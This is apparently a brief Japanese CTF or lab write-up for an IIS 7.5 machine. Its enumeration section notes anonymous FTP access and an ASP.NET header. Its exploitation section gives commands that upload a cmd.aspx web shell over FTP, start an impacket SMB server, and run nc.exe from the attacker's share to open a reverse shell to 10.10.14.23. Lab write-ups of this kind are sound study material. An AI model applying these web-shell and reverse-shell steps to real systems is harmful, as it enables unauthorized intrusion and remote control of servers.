# Enumeration
- port 21 で anonymous login が許可された ftp
  - ログインすると、welcome.png がある
    ```
    ftp> dir
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    03-18-17  02:06AM       <DIR>          aspnet_client
    03-17-17  05:37PM                  689 iisstart.htm
    03-17-17  05:37PM               184946 welcome.png
    226 Transfer complete.
    ```
  - ここにファイルを置くとブラウザ等で閲覧可能
- port 80 で Microsoft IIS httpd 7.5
  - HTTP ヘッダを確認すると `X-powered-by: ASP.NET`
  - Web shell のアップロードにより shell が取れそう

# Eploitation
- `cmd.aspx` を置く
  - `ftp> put ~/tools/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx cmd.aspx`
- `nc.exe` を使って reverse shell を張る
  - SMBを使えば、わざわざ置かなくてもいい
  - `sudo python3 ~/tools/impacket/examples/smbserver.py share .` でsmbサーバを立てる
  - `http://$IP/cmd.aspx` にアクセス
  - `\\10.10.14.23\share\nc.exe -e cmd.exe 10.10.14.23 12345`

